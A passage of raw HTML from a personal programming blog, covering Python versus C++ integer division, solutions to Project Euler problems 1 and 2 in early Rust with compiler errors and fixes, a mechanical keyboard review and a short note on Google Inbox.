    <span style="color: #f8f8f2">std</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">cout</span> <span style="color: #f92672">&lt;&lt;</span> <span style="color: #ae81ff">10</span> <span style="color: #f92672">/</span> <span style="color: #ae81ff">3</span> <span style="color: #f92672">&lt;&lt;</span> <span style="color: #f8f8f2">std</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">endl;</span>
    <span style="color: #f8f8f2">std</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">cout</span> <span style="color: #f92672">&lt;&lt;</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">float</span><span style="color: #f8f8f2">)</span><span style="color: #ae81ff">10</span> <span style="color: #f92672">/</span> <span style="color: #ae81ff">3</span> <span style="color: #f92672">&lt;&lt;</span> <span style="color: #f8f8f2">std</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">endl;</span>

    <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>


<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">$<span style="color: #f92672">]</span> ./a.out 
3
3.33333
</pre></div>
</p>

<p>I understand that if you are dividing numbers you will want to have
the accuracy of the float type, but I find this a bit of an odd choice
for the Python devs to make. But perhaps this is the future, and I&rsquo;m
just too old to accept what you whippersnappers are up to with your
fancy <a href="http://i.imgur.com/GUum4gy.gif">languages and tools</a>.</p>

<p>Ultimately, does it really matter? Well yes and no. No, because Python is
dynamically typed, so it doesn&rsquo;t really matter what type the result is, whatever
it gets assigned too will become what it needs to. Yes, because there may be
times when getting a float might cause unexpected behaviour.</p>

<p>It&rsquo;s not the end of the world as such, because the <em>no</em> above greatly
outweighs the <em>yes</em>, but I&rsquo;m still a little surprised at this change. I would
perhaps have kept <code>/</code> as it is and made <code>//</code> the one that always returns a float.</p>

<p>And just to finish:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">Python</span> <span style="color: #ae81ff">3.4</span><span style="color: #f92672">.</span><span style="color: #ae81ff">0</span>
<span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #ae81ff">10</span><span style="color: #f92672">//</span><span style="color: #ae81ff">3</span>
<span style="color: #ae81ff">3</span>
<span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #ae81ff">10</span><span style="color: #f92672">//</span><span style="color: #ae81ff">3.0</span>
<span style="color: #ae81ff">3.0</span>
</pre></div>
</p>

<p><a href="http://i.imgur.com/WEllYN3.gif">Yeah, sure, why not?</a></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/01/20/solving-project-euler-with-rust-2/">
        Solving Project Euler with Rust 2
      </a>
    </h1>

    <span class="post-date">Tue, Jan 20, 2015</span>

    <p>Carrying on with <a href="http://unlogic.co.uk/2015/01/12/solving-project-euler-with-rust-1/">the series</a>, here&rsquo;s
how I solved Project Euler&rsquo;s problem 2:</p>

<pre><code>Even Fibonacci numbers
Problem 2
Each new term in the Fibonacci sequence is generated by adding the previous 
two terms. By starting with 1 and 2, the first 10 terms will be:

    1, 2, 3, 5, 8, 13, 21, 34, 55, 89, ...

By considering the terms in the Fibonacci sequence whose values do not 
exceed four million, find the sum of the even-valued terms.
</code></pre>

<p>Fairly similar to the previous one, in terms that we need to sum a sequence
of filtered numbers. This time though the sequence is not a straight run,
but the fibonacci sequence.</p>

<p>As usual with these issues I assume we will need a recursive function to generate
our fibonacci numbers:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> fib(n</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2">) </span><span style="color: #f92672">-&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2">{</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">if</span><span style="color: #f8f8f2"> n </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2"> { </span>
<span style="color: #f8f8f2">        </span><span style="color: #66d9ef">return</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">    } </span><span style="color: #66d9ef">else</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">if</span><span style="color: #f8f8f2"> n </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2"> {</span>
<span style="color: #f8f8f2">        </span><span style="color: #66d9ef">return</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">    } </span><span style="color: #66d9ef">else</span><span style="color: #f8f8f2"> {</span>
<span style="color: #f8f8f2">        </span><span style="color: #66d9ef">return</span><span style="color: #f8f8f2"> fib(n</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">) </span><span style="color: #f92672">+</span><span style="color: #f8f8f2"> fib(n</span><span style="color: #f92672">-</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">    }    </span>
<span style="color: #f8f8f2">}</span>
</pre></div>


<p>As I am still learning Rust, I am not sure if there&rsquo;s more Rustacean way of doing it.
I couldn&rsquo;t find anything relevant to this in the docs, so for now I will leave it
as it is until I get some feedback on it. I wonder if a closure would be better?</p>

<p>EDIT: From the comments below (thanks pf), this is a much more Rust like implementation IMO:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> fib(n</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2">) </span><span style="color: #f92672">-&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2">{</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">match</span><span style="color: #f8f8f2"> n {</span>
<span style="color: #f8f8f2">        </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">=&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span>
<span style="color: #f8f8f2">        </span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">=&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span>
<span style="color: #f8f8f2">        _ </span><span style="color: #f92672">=&gt;</span><span style="color: #f8f8f2"> fib(n</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">) </span><span style="color: #f92672">+</span><span style="color: #f8f8f2"> fib(n</span><span style="color: #f92672">-</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">),</span>
<span style="color: #f8f8f2">    }    </span>
<span style="color: #f8f8f2">}</span>
</pre></div>


<p>Now I need to get a list of numbers while the return of the <code>fib</code> function
is &lt; 4,000,000. I cheated a bit here, as I figured out that the max number
to pass to the function in this case is 34.
I would assume that in the <em>more correct</em> way of doing it, the limit is
defined in a better way.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> main() {</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> vals </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> (</span><span style="color: #ae81ff">1.</span><span style="color: #f8f8f2">.</span><span style="color: #ae81ff">34</span><span style="color: #f8f8f2">).map(</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">x</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> fib(x));</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>Thinking back to the previous example I already know about filter and sum.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> main() {</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> vals </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> (</span><span style="color: #ae81ff">1.</span><span style="color: #f8f8f2">.</span><span style="color: #ae81ff">34</span><span style="color: #f8f8f2">).map(</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">x</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> fib(x))</span>
<span style="color: #f8f8f2">                .filter(</span><span style="color: #f92672">|&amp;</span><span style="color: #f8f8f2">x</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> x </span><span style="color: #f92672">%</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span>
<span style="color: #f8f8f2">                .sum();</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>But there&rsquo;s a problem:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">   Compiling euler_2 v0.0.1 (file:////work/sandbox/euler_rust/euler_2)
/work/sandbox/euler_rust/euler_2/src/main.rs:16:10: 16:15 error: type `core::iter::Filter&lt;i32, core::iter::Map&lt;i32, i32, core::ops::Range&lt;i32&gt;, closure[/work/sandbox/euler_rust/euler_2/src/main.rs:14:32: 14:42]&gt;, closure[/work/sandbox/euler_rust/euler_2/src/main.rs:15:17: 15:31]&gt;` does not implement any method in scope named `sum`
/work/sandbox/euler_rust/euler_2/src/main.rs:16         .sum();
                                                        ^~~~~
error: aborting due to previous error
Could not compile `euler_2`.
</pre></div>
</p>

<p>Seems like <code>sum</code> won&rsquo;t work here due to the <code>map</code>. Not to worry, I used <code>fold</code> in the previous example,
before the helpful folks at <a href="http://reddit.com/r/rust">/r/rust</a> told me about <code>sum</code>,
so let&rsquo;s use that instead, as that should work.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> main() {</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> vals </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> (</span><span style="color: #ae81ff">1.</span><span style="color: #f8f8f2">.</span><span style="color: #ae81ff">34</span><span style="color: #f8f8f2">).map(</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">x</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> fib(x))</span>
<span style="color: #f8f8f2">                .filter(</span><span style="color: #f92672">|&amp;</span><span style="color: #f8f8f2">x</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> x </span><span style="color: #f92672">%</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span>
<span style="color: #f8f8f2">                .fold(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">, </span><span style="color: #f92672">|</span><span style="color: #f8f8f2">a, b</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> a </span><span style="color: #f92672">+</span><span style="color: #f8f8f2"> b);</span>
<span style="color: #f8f8f2">    </span>
<span style="color: #f8f8f2">   println</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;{}&quot;</span><span style="color: #f8f8f2">, vals);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>EDIT: <code>sum</code> does work, I just forgot to add <code>use std::iter::AdditiveIterator;</code> at the
top of the file. The Github file contains this fix.</p>

<p>Let&rsquo;s run it:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">cargo run
     Running `target/euler_2`
4613732
</pre></div>
</p>

<p>The result checks out, so Project Euler 2 has been solved.</p>

<p>What I would like to know though: Is there a better way to generate the
fibonacci sequence? If you have suggestions (or about anything else on this page),
please leave me a message below. After all, this is a learning exercise for me
and for anyone else interested.</p>

<p>EDIT: With some marvellous feedback (which is a great benefit of posting
these) I have edited the code on Github to use an iterator instead of the recursive call.</p>

<p>The code is now (main credit to /u/emk and others):</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">use</span><span style="color: #f8f8f2"> std</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">iter</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">AdditiveIterator;</span>

<span style="color: #75715e">#[derive(Copy)]</span><span style="color: #f8f8f2"></span>
<span style="color: #66d9ef">pub</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">struct</span><span style="color: #f8f8f2"> FibonacciSequence {</span>
<span style="color: #f8f8f2">    n_minus_1</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">u32</span><span style="color: #f8f8f2">,</span>
<span style="color: #f8f8f2">    n_minus_2</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">u32</span><span style="color: #f8f8f2"></span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">impl</span><span style="color: #f8f8f2"> Iterator </span><span style="color: #66d9ef">for</span><span style="color: #f8f8f2"> FibonacciSequence {</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">type</span><span style="color: #f8f8f2"> Item </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">u32</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> next(</span><span style="color: #f92672">&amp;</span><span style="color: #66d9ef">mut</span><span style="color: #f8f8f2"> self) </span><span style="color: #f92672">-&gt;</span><span style="color: #f8f8f2"> Option</span><span style="color: #f92672">&lt;</span><span style="color: #66d9ef">u32</span><span style="color: #f92672">&gt;</span><span style="color: #f8f8f2"> {</span>
<span style="color: #f8f8f2">        </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">mut</span><span style="color: #f8f8f2"> result </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> self.n_minus_1 </span><span style="color: #f92672">+</span><span style="color: #f8f8f2"> self.n_minus_2;</span>

<span style="color: #f8f8f2">        </span><span style="color: #75715e">// Special case: If all our fields are zero, we want to generate</span>
<span style="color: #f8f8f2">        </span><span style="color: #75715e">// our initial 1.  Everything else will work correctly from here.</span>
<span style="color: #f8f8f2">        </span><span style="color: #66d9ef">if</span><span style="color: #f8f8f2"> result </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2"> { result </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">; }</span>

<span style="color: #f8f8f2">        self.n_minus_2 </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> self.n_minus_1;</span>
<span style="color: #f8f8f2">        self.n_minus_1 </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> result;</span>
<span style="color: #f8f8f2">        Some(result)</span>
<span style="color: #f8f8f2">    }</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">pub</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> fibonacci_sequence() </span><span style="color: #f92672">-&gt;</span><span style="color: #f8f8f2"> FibonacciSequence {</span>
<span style="color: #f8f8f2">    FibonacciSequence{n_minus_1</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">, n_minus_2</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">}</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> main() {</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> sum </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> fibonacci_sequence()</span>
<span style="color: #f8f8f2">        .filter(</span><span style="color: #f92672">|&amp;</span><span style="color: #f8f8f2">v</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> v </span><span style="color: #f92672">%</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span>
<span style="color: #f8f8f2">        .take_while(</span><span style="color: #f92672">|&amp;</span><span style="color: #f8f8f2">v</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> v </span><span style="color: #f92672">&lt;=</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">4000000</span><span style="color: #66d9ef">u32</span><span style="color: #f8f8f2">)</span>
<span style="color: #f8f8f2">        .sum();</span>

<span style="color: #f8f8f2">    println</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Result: {}&quot;</span><span style="color: #f8f8f2">, sum);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>The interesting thing is the performance difference between the iterator
implementation and the recursive call. The recursive implementation timings
are:</p>

<pre><code>real    0m0.311s
user    0m0.255s
sys 0m0.035s
</code></pre>

<p>Versus the timings of the iterator:</p>

<pre><code>real    0m0.079s
user    0m0.025s
sys 0m0.035s
</code></pre>

<p>Clearly a vast improvement there at the cost of a little extra code.
With the iterator the benefit stems from the fact that we track where we
are in the sequence. So for each number we don&rsquo;t need to recursively
call the <code>fib</code> function until n is 1, which is where the big saving comes from.</p>

<p>This and all future solutions are on <a href="https://github.com/Svenito/euler_rust">my Github</a></p>

<p>Also posted to <a href="https://www.reddit.com/r/rust/comments/2t23ow/still_learning_rust_following_on_with_a_write_up/">/r/rust</a></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/01/15/wasd-v2/">
        WASD V2
      </a>
    </h1>

    <span class="post-date">Thu, Jan 15, 2015</span>

    <p>It arrived! I am now the proud owner of a WASD V2 mechanical keyboard. I ordered
it with brown MX switches, large centered font and light grey alphanumeric caps
and grey modifiers. I went of the 87 key version (no keypad) and also threw in a
wrist rest to go with it.</p>


<figure >
    
        <img src="#ZgotmplZ" />
    
    
</figure>


<p>Yes, this isn&rsquo;t the most stylish photo, plus there&rsquo;s no shoe in it either.</p>

<p>This is my first mechanical keyboard so I can&rsquo;t really compare it to anything.
That said, I very much love the feel of the keyboard and really enjoy typing on it.
It&rsquo;s solidly built and the keys are very well printed. Although I would
still like some <a href="https://c1.staticflickr.com/7/6024/5886540547_abdb8c837f_z.jpg">dolch keycaps</a>
at some point in the future.</p>

<p>So thanks to WASD for shipping (2 weeks to the UK from point of ordering) such a
lovely keyboard to me. If you are after your own mechanical keyboard, you can&rsquo;t
go wrong with a WASD. I&rsquo;m even tempted to get a CODE in the future maybe.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/01/12/checking-in-follow-up/">
        Checking in follow up
      </a>
    </h1>

    <span class="post-date">Mon, Jan 12, 2015</span>

    <p>In a <a href="http://unlogic.co.uk/2014/10/29/checking-in/">previous post</a> I wrote about how I use
my inbox as a TODO list. Since then I have received my Google Inbox invite and have now
been using Inbox exclusively to manage my email.</p>

<p>It works pretty much as I expected, which is great. The added bonus of its &ldquo;Bundles&rdquo; is
a nice touch, and it&rsquo;s pretty smart about putting email into those bundles. I&rsquo;m using
it pretty much as I did my old inbox, but it&rsquo;s more tailored to my way of working, allowing
me to swipe the mail to archive, and optionally delete it, pin it, or file it into a different
bundle. Once a mail is in a bundle they get grouped together and appear in a single &ldquo;block&rdquo;, making
your inbox less cluttered.</p>

<p>I have a few invites left for those who are interested, but by now I imagine anyone who wants
and invite, will have had one.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/01/12/solving-project-euler-with-rust-1/">
        Solving Project Euler with Rust 1
      </a>
    </h1>

    <span class="post-date">Mon, Jan 12, 2015</span>

    <p>It&rsquo;s time to poke at <a href="http://www.rust-lang.org/">Rust</a> a little bit. And what
better way to get acquainted with a new language than to solve
some problems with it? And seeing as there&rsquo;s not always a suitably
simple problem handy, I&rsquo;ve picked some problems from <a href="https://projecteuler.net">Project Euler</a>
to tackle. I am using Rust 1.0.0Alpha in this post.</p>

<p>The first problem is:</p>

<pre><code>Multiples of 3 and 5
Problem 1
If we list all the natural numbers below 10 that are multiples of 3 or 5, 
we get 3, 5, 6 and 9. The sum of these multiples is 23.

Find the sum of all the multiples of 3 or 5 below 1000.
</code></pre>

<p>Ok, so sounds fairly ok and I&rsquo;m going to add another requirement: To prompt the
user for the max number (in this case the 1000). Just a little extra exercise. I&rsquo;ve
read the <a href="http://rustbyexample.com/">Rust By Example</a> pages and the new and official
<a href="http://doc.rust-lang.org/1.0.0-alpha/book">Rust book</a> and let&rsquo;s see how we get on.</p>

<p>First let&rsquo;s define some structure:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> solve(max_num</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2">) </span><span style="color: #f92672">-&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2"> {</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> result </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> max_num;</span>
<span style="color: #f8f8f2">    result</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> main() {</span>
<span style="color: #f8f8f2">    println</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Total sum: {}&quot;</span><span style="color: #f8f8f2">, solve(</span><span style="color: #ae81ff">10</span><span style="color: #f8f8f2">));</span>
<span style="color: #f8f8f2">}</span>
</pre></div>


<p><code>cargo run</code> simply prints out <code>Total sum: 10</code>. That&rsquo;s what we expect. I use <code>let result = 10;</code>
because I will be putting the result into a variable. The <code>result</code> with the semicolon
omitted is our return value. So far, so good.</p>

<p>Let&rsquo;s try to sum up the relevant numbers with a hard coded max value of 10.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> solve(max_num</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2">) </span><span style="color: #f92672">-&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2"> {</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> numbers </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> range(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">, max_num).filter(</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">i</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">*</span><span style="color: #f8f8f2">i </span><span style="color: #f92672">%</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">||</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">*</span><span style="color: #f8f8f2">i </span><span style="color: #f92672">%</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">5</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">    numbers.fold(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">, </span><span style="color: #f92672">|</span><span style="color: #f8f8f2">acc, x</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> acc </span><span style="color: #f92672">+</span><span style="color: #f8f8f2"> x)</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> main() {</span>
<span style="color: #f8f8f2">    println</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Total sum: {}&quot;</span><span style="color: #f8f8f2">, solve(</span><span style="color: #ae81ff">10</span><span style="color: #f8f8f2">));</span>
<span style="color: #f8f8f2">}</span>
</pre></div>


<p>Looks fun, right? So what&rsquo;s going on? First we generate a range iterator of numbers
divisible by 3 and 5. Pay attention to the <code>*i</code> which we need to use because the
filter value <code>i</code> is of type <code>&amp;i32</code> and without it Rust handily tells you the same:</p>

<pre><code>error: binary operation `%` cannot be applied to type `&amp;i32`
</code></pre>

<p>Next we use <code>fold</code> to sum all the entries. The <a href="http://doc.rust-lang.org/1.0.0-alpha/core/iter/trait.IteratorExt.html#method.fold">docs</a>
explain fold like this:</p>

<pre><code>Performs a fold operation over the entire iterator, returning the eventual
state at the end of the iteration.
</code></pre>

<p>In this case we can liken it to Python&rsquo;s <code>map</code> function if you like, but a little different.
The first argument is the initial value that gets assigned to <code>acc</code>. Then the result of <code>acc + x</code>
gets assigned to <code>acc</code> to each entry <code>x</code>. Ultimately it&rsquo;s a <code>sum</code> in Python world.</p>

<p>Functionally we&rsquo;re done. The problem is solved as far as the initial requirement are concerned.
But I want to add some user input, so let&rsquo;s go over that part next.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> solve(max_num</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2">) </span><span style="color: #f92672">-&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">i32</span><span style="color: #f8f8f2"> {</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> numbers </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> range(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">, max_num).filter(</span><span style="color: #f92672">|</span><span style="color: #f8f8f2">i</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">*</span><span style="color: #f8f8f2">i </span><span style="color: #f92672">%</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">||</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">*</span><span style="color: #f8f8f2">i </span><span style="color: #f92672">%</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">5</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">==</span><span style="color: #f8f8f2"> </span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">    numbers.fold(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">, </span><span style="color: #f92672">|</span><span style="color: #f8f8f2">acc, x</span><span style="color: #f92672">|</span><span style="color: #f8f8f2"> acc </span><span style="color: #f92672">+</span><span style="color: #f8f8f2"> x)</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">fn</span><span style="color: #f8f8f2"> main() {</span>
<span style="color: #f8f8f2">    print</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Enter the max number: &quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> input </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> std</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">io</span><span style="color: #f92672">::</span><span style="color: #f8f8f2">stdin().read_line().ok().expect(</span><span style="color: #e6db74">&quot;Failed to read line&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">    </span><span style="color: #66d9ef">let</span><span style="color: #f8f8f2"> input_num</span><span style="color: #f92672">:</span><span style="color: #f8f8f2"> Option</span><span style="color: #f92672">&lt;</span><span style="color: #66d9ef">i32</span><span style="color: #f92672">&gt;</span><span style="color: #f8f8f2"> </span><span style="color: #f92672">=</span><span style="color: #f8f8f2"> input.trim().parse();</span>
<span style="color: #f8f8f2">    </span>
<span style="color: #f8f8f2">    println</span><span style="color: #f92672">!</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Total sum: {}&quot;</span><span style="color: #f8f8f2">, solve(input_num));</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>We read the user input and make sure it was read ok (this is explained in detail in the book)
then we convert the input to <code>i32</code>. The <code>trim</code> is required to remove the newline char
at the nd of the input and the <code>parse</code> does the conversion.</p>

<p>But if we try to run this we get the following error:</p>

<pre><code>error: mismatched types: expected `i32`, found `core::option::Option&lt;i32&gt;` 
(expected i32, found enum core::option::Option)
</code></pre>

<p>Right, because it&rsquo;s still an <code>Option&lt;i32&gt;</code> type. Helpfully the book explains that we need to
unwrap the <code>Option</code>, and the best way to do this is with <code>match</code>:</p>

